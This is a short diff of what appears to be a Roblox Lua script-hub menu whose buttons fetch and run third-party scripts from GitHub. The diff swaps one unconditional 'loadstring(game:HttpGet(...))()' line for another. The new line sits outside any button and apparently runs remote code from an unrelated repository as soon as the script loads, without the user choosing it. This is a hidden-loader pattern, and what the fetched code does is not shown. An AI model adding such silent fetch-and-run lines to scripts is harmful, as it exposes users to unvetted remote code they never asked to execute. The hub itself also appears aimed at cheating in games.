@@ -994,6 +994,5 @@ MainSection:NewButton("Faded", "Loads Faded GUI", function()
             MainSection:NewButton("Duckys Selling Gui", "Loads Duckys Selling Gui", function()
                 loadstring(game:HttpGet("https://raw.githubusercontent.com/MsorkyScripts/SellerScript/main/output-CNsg%20(1).lua"))()
                 end)
-
-            wait(0.1)
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/yvngispapi/y/main/y"))()
+                wait(0.1)
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/Crostide/Counter/main/Cash"))()
